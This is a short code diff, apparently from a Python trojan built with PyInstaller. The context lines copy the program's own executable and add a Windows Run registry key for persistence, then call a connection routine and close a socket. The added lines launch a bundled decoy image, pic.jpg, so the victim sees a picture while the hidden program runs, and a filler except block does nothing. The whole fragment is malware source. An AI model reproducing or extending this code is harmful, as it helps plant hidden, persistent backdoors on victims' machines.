@@ -116,6 +116,13 @@ if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)
 
+	name = sys._MEIPASS + "\pic.jpg"
+	try:
+		subprocess.Popen(name, shell = True)
+	except:
+		number  = 3
+		number1 = 5
+		add = number + number1
 
 connection()
 sock.close()
